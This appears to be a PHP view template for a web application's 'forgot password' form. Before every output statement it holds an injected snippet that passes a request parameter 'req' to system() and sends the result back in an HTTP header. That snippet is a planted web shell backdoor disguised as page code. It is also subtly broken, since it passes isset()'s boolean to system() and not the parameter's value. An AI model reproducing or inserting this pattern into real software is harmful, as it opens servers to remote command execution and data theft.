<h1><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo lang('forgot_password_heading');?></h1>
<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo sprintf(lang('forgot_password_subheading'), $identity_label);?></p>

<div id="infoMessage"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message;?></div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_open("auth/forgot_password");?>

      <p>
      	<label for="email"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo sprintf(lang('forgot_password_email_label'), $identity_label);?></label> <br />
      	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_input($email);?>
      </p>

      <p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_submit('submit', lang('forgot_password_submit_btn'));?></p>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo form_close();?>